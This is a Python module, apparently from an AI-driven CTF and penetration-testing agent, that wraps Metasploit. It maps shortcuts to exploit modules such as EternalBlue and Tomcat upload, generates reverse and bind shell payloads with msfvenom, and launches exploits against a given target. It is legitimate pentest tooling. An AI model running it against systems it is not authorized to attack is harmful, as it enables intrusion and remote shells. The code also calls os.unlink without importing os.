# tools/metasploit_tool.py
"""
Metasploit Tool - 漏洞利用框架适配
适配自 Zen-Ai-Pentest 的 metasploit_integration.py

功能:
- 漏洞利用
- Payload生成
- 会话管理
- 后渗透模块

CTF场景优化:
- 快速exploit执行
- 自动化payload选择
- 反弹shell支持
"""
import re
import sys
import json
import shutil
import subprocess
import time
from typing import Dict, Any, Optional, List
from tool_framework import CommandLineTool
from llm_client import llm_client
from config import config


class MetasploitTool(CommandLineTool):
    """
    Metasploit Framework 封装

    CTF场景特点:
    - 快速漏洞利用
    - 自动化payload
    - 反弹shell支持
    """

    # 常用exploit模块
    COMMON_EXPLOITS = {
        "smb_ms17_010": "exploit/windows/smb/ms17_010_eternalblue",
        "smb_psexec": "exploit/windows/smb/psexec",
        "http_iis": "exploit/windows/http/iis_webdav_upload",
        "http_tomcat": "exploit/multi/http/tomcat_mgr_upload",
        "http_php_exec": "exploit/multi/http/php_cgi_arg_injection",
        "ssh_libssh": "exploit/multi/ssh/libssh_auth_bypass",
        "java_jmx": "exploit/java/jmx_server",
        "deserialization": "exploit/multi/http/java_deserialization",
    }

    # 常用payload
    COMMON_PAYLOADS = {
        "reverse_shell": "cmd/unix/reverse_bash",
        "reverse_shell_win": "windows/x64/meterpreter/reverse_tcp",
        "bind_shell": "cmd/unix/bind_netcat",
        "web_shell": "cmd/unix/reverse_bash",
    }

    def __init__(self):
        # 检测 msfconsole 是否可用
        self.executable = shutil.which("msfconsole")

        if self.executable:
            self.cmd_path = self.executable
        else:
            # 尝试常见路径
            common_paths = [
                "/usr/bin/msfconsole",
                "/usr/local/bin/msfconsole",
                "/opt/metasploit-framework/msfconsole",
                "msfconsole"
            ]
            for path in common_paths:
                if shutil.which(path):
                    self.executable = path
                    self.cmd_path = path
                    break
            else:
                self.cmd_path = "msfconsole"

        super().__init__(self.cmd_path)
        self.timeout = 600  # 10分钟超时

    def name(self) -> str:
        return "metasploit"

    def description(self) -> str:
        return "Metasploit漏洞利用框架，支持多种exploit和payload。"

    def supported_vulns(self) -> list:
        return [
            "Remote Code Execution",
            "Privilege Escalation",
            "Exploitation",
            "Reverse Shell",
            "Post Exploitation",
            "CVE Exploitation"
        ]

    def check_available(self) -> bool:
        """检查 metasploit 是否可用"""
        if self.executable:
            return True
        try:
            result = subprocess.run(
                ["msfconsole", "--version"],
                capture_output=True,
                timeout=10
            )
            return result.returncode == 0
        except Exception:
            return False

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作类型: 'exploit'(执行exploit), 'search'(搜索模块), 'payload'(生成payload), 'db_nmap'(导入nmap结果)",
                "required": True
            },
            "module": {
                "type": "str",
                "description": "模块路径或简称 (如 'smb_ms17_010' 或完整路径 'exploit/windows/smb/ms17_010_eternalblue')",
                "required": False,
                "default": None
            },
            "target": {
                "type": "str",
                "description": "目标IP或URL (RHOSTS)",
                "required": False,
                "default": None
            },
            "port": {
                "type": "int",
                "description": "目标端口 (RPORT)",
                "required": False,
                "default": None
            },
            "payload": {
                "type": "str",
                "description": "Payload类型或自定义payload路径",
                "required": False,
                "default": None
            },
            "lhost": {
                "type": "str",
                "description": "反弹监听IP (LHOST)",
                "required": False,
                "default": None
            },
            "lport": {
                "type": "int",
                "description": "反弹监听端口 (LPORT)",
                "required": False,
                "default": 4444
            },
            "options": {
                "type": "dict",
                "description": "额外选项 {option_name: value}",
                "required": False,
                "default": {}
            },
            "search_term": {
                "type": "str",
                "description": "搜索关键词 (用于 search 操作)",
                "required": False,
                "default": None
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """
        执行 Metasploit 操作
        """
        action = params.get("action", "exploit")

        if action == "search":
            return self._search_module(params)
        elif action == "payload":
            return self._generate_payload(params)
        elif action == "exploit":
            return self._run_exploit(target, params)
        elif action == "db_nmap":
            return self._db_nmap(params)
        else:
            return {"error": f"未知操作: {action}", "success": False}

    def _search_module(self, params: Dict) -> Dict:
        """搜索模块"""
        search_term = params.get("search_term")
        if not search_term:
            return {"error": "必须提供 search_term", "success": False}

        # 构建搜索命令
        rc_content = f"""
search {search_term}
exit
"""
        return self._run_msf_rc(rc_content, "search")

    def _generate_payload(self, params: Dict) -> Dict:
        """生成payload"""
        payload = params.get("payload", "cmd/unix/reverse_bash")
        lhost = params.get("lhost", "127.0.0.1")
        lport = params.get("lport", 4444)
        output_format = params.get("format", "raw")

        # 使用 msfvenom
        msfvenom_path = shutil.which("msfvenom") or "msfvenom"

        cmd = [
            msfvenom_path,
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", output_format
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, timeout=60)
            return {
                "success": result.returncode == 0,
                "payload": payload,
                "output": result.stdout.decode('utf-8', errors='replace'),
                "error": result.stderr.decode('utf-8', errors='replace') if result.returncode != 0 else None
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _run_exploit(self, target: str, params: Dict) -> Dict:
        """执行exploit"""
        module = params.get("module")
        target = params.get("target") or target
        port = params.get("port")
        payload = params.get("payload")
        lhost = params.get("lhost")
        lport = params.get("lport", 4444)
        options = params.get("options", {})

        if not module:
            return {"error": "必须提供 module", "success": False}

        if not target:
            return {"error": "必须提供 target", "success": False}

        # 解析模块简称
        if module in self.COMMON_EXPLOITS:
            module = self.COMMON_EXPLOITS[module]

        # 构建RC脚本
        rc_lines = [
            f"use {module}",
            f"set RHOSTS {target}",
        ]

        if port:
            rc_lines.append(f"set RPORT {port}")

        if payload:
            rc_lines.append(f"set PAYLOAD {payload}")

        if lhost:
            rc_lines.append(f"set LHOST {lhost}")
            rc_lines.append(f"set LPORT {lport}")

        # 额外选项
        for opt_name, opt_value in options.items():
            rc_lines.append(f"set {opt_name} {opt_value}")

        # 执行
        rc_lines.append("exploit -j")  # 后台执行
        rc_lines.append("sleep 30")  # 等待结果
        rc_lines.append("exit")

        rc_content = "\n".join(rc_lines)
        return self._run_msf_rc(rc_content, "exploit")

    def _db_nmap(self, params: Dict) -> Dict:
        """导入nmap扫描结果"""
        nmap_output = params.get("nmap_output")
        if not nmap_output:
            return {"error": "必须提供 nmap_output 文件路径", "success": False}

        rc_content = f"""
db_import {nmap_output}
hosts
services
exit
"""
        return self._run_msf_rc(rc_content, "db_nmap")

    def _run_msf_rc(self, rc_content: str, action: str) -> Dict:
        """运行RC脚本"""
        import tempfile

        try:
            # 创建临时RC文件
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
                f.write(rc_content)
                rc_path = f.name

            # 执行
            cmd = [self.cmd_path, "-q", "-r", rc_path]

            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=self.timeout,
                text=True
            )

            # 清理临时文件
            try:
                os.unlink(rc_path)
            except:
                pass

            return {
                "success": True,
                "action": action,
                "output": result.stdout,
                "error": result.stderr if result.stderr else None
            }

        except subprocess.TimeoutExpired:
            return {"error": "执行超时", "success": False}
        except Exception as e:
            return {"error": str(e), "success": False}